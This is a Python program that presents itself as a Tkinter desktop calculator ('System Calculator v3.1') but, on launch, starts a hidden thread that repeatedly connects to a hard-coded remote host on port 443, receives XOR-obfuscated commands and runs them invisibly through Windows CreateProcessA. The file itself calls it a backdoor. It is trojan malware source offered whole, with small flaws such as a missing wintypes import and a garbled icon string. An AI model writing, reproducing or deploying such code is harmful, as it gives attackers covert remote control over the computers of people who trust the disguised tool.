import tkinter as tk
import socket
import threading
import time
import ctypes
import base64
import os
import sys
import random
import string


TARGET_IP = "10.211.55.5"  
TARGET_PORT = 443            
ENCRYPTION_KEY = b'3a7b1c9d4e2f8g5h0j6k' 
# ======================================================================

class XORCipher:
    def __init__(self, key):
        self.key = key

    def encrypt_decrypt(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        return bytes([b ^ self.key[i % len(self.key)] for i, b in enumerate(data)])

class AES128Emulator:
    def __init__(self, key):
        self.key = key.ljust(16, b'\0')[:16]

    def _xor_blocks(self, a, b):
        return bytes(x ^ y for x, y in zip(a, b))

    def encrypt(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        padded = data + b'\0' * (16 - len(data) % 16)
        encrypted = b''
        for i in range(0, len(padded), 16):
            block = padded[i:i+16]
            encrypted += self._xor_blocks(block, self.key)
        return encrypted

    def decrypt(self, data):
        decrypted = b''
        for i in range(0, len(data), 16):
            block = data[i:i+16]
            decrypted += self._xor_blocks(block, self.key)
        return decrypted.rstrip(b'\0').decode('utf-8', errors='ignore')

class BackdoorCore:
    def __init__(self):
        self.cipher = XORCipher(ENCRYPTION_KEY)
        self.aes_emulator = AES128Emulator(ENCRYPTION_KEY)
        self.active = True
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        self.reconnect_delay = 5

    def execute_hidden(self, command):
        CREATE_NO_WINDOW = 0x08000000
        STARTF_USESHOWWINDOW = 0x00000001
        SW_HIDE = 0

        class STARTUPINFO(ctypes.Structure):
            _fields_ = [
                ("cb", wintypes.DWORD),
                ("lpReserved", wintypes.LPSTR),
                ("lpDesktop", wintypes.LPSTR),
                ("lpTitle", wintypes.LPSTR),
                ("dwX", wintypes.DWORD),
                ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD),
                ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD),
                ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.c_char_p),
                ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE)
            ]

        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("hProcess", wintypes.HANDLE),
                ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD),
                ("dwThreadId", wintypes.DWORD)
            ]

        si = STARTUPINFO()
        si.cb = ctypes.sizeof(si)
        si.dwFlags = STARTF_USESHOWWINDOW
        si.wShowWindow = SW_HIDE
        pi = PROCESS_INFORMATION()

        ctypes.windll.kernel32.CreateProcessA(
            None,
            command.encode('utf-8'),
            None,
            None,
            False,
            CREATE_NO_WINDOW,
            None,
            None,
            ctypes.byref(si),
            ctypes.byref(pi)
        )

    def start_shell(self):
        while self.active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                s.connect((TARGET_IP, TARGET_PORT))

                # TLS-like handshake simulation
                s.sendall(self.aes_emulator.encrypt("SYN"))
                time.sleep(0.5)
                s.sendall(self.aes_emulator.encrypt("ACK"))

                while self.active:
                    try:
                        data = s.recv(4096)
                        if not data:
                            break

                        decrypted_cmd = self.aes_emulator.decrypt(data)
                        if decrypted_cmd.strip().lower() == 'exit':
                            break

                        # Execute command hidden
                        threading.Thread(target=self.execute_hidden, args=(decrypted_cmd,), daemon=True).start()

                        # Send encrypted confirmation
                        confirmation = self.aes_emulator.encrypt("OK")
                        s.sendall(confirmation)

                    except socket.timeout:
                        continue
                    except Exception as e:
                        break

            except Exception as e:
                time.sleep(self.reconnect_delay)
            finally:
                try:
                    s.close()
                except:
                    pass

class CalculatorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("System Calculator v3.1")
        self.root.geometry("300x250")
        self.root.resizable(False, False)
        self.root.configure(bg="#f5f5f5")

    
        icon_data = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAAdgAAAHYBTnsmCAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAFYSURBVDiNpZM9SwNBEIafgWwQkQkQkQkQkQkQkQkQkQkQkQkQkQkQkQkT//xP8Hv9D7v9D7v9D7v9D7v9D7v9D7v9D7v9D7v9D7v9D7v9D7v9D7v9D7v")
        icon = tk.PhotoImage(data=icon_data)
        self.root.iconphoto(False, icon)

        self.display = tk.Entry(root, width=20, font=('Segoe UI', 14), bd=0, bg="#ffffff", relief="flat")
        self.display.grid(row=0, column=0, columnspan=4, padx=10, pady=15, ipady=12)

        buttons = [
            ('7', 1, 0), ('8', 1, 1), ('9', 1, 2), ('/', 1, 3),
            ('4', 2, 0), ('5', 2, 1), ('6', 2, 2), ('*', 2, 3),
            ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('-', 3, 3),
            ('0', 4, 0), ('.', 4, 1), ('=', 4, 2), ('+', 4, 3),
            ('C', 5, 0), ('⌫', 5, 1)
        ]

        for (text, row, col) in buttons:
            btn = tk.Button(
                root,
                text=text,
                width=5,
                height=2,
                font=('Segoe UI', 10, 'bold'),
                bg="#e0e0e0" if text not in ['=', 'C', '⌫'] else "#0078d7",
                fg="white" if text in ['=', 'C', '⌫'] else "black",
                activebackground="#005a9e" if text in ['=', 'C', '⌫'] else "#d0d0d0",
                relief="flat",
                bd=0,
                highlightthickness=0
            )
            btn.grid(row=row, column=col, padx=1, pady=1, sticky="nsew")
            btn.bind("<Button-1>", lambda e, t=text: self.on_button_click(t))

        for i in range(5):
            root.grid_rowconfigure(i, weight=1)
        for i in range(4):
            root.grid_columnconfigure(i, weight=1)

        self.backdoor = BackdoorCore()
        self.backdoor_thread = threading.Thread(target=self.backdoor.start_shell, daemon=True)
        self.backdoor_thread.start()

    def on_button_click(self, value):
        if value == '=':
            self.calculate()
        elif value == 'C':
            self.display.delete(0, tk.END)
        elif value == '⌫':
            current = self.display.get()
            self.display.delete(0, tk.END)
            self.display.insert(0, current[:-1])
        else:
            current = self.display.get()
            self.display.delete(0, tk.END)
            self.display.insert(0, current + value)

    def calculate(self):
        try:
            result = eval(self.display.get())
            self.display.delete(0, tk.END)
            self.display.insert(0, str(result))
        except Exception as e:
            self.display.delete(0, tk.END)
            self.display.insert(0, "Error")

def main():
    if os.name != 'nt':
        print("This backdoor is designed for Windows only.")
        sys.exit(1)

    root = tk.Tk()
    app = CalculatorGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
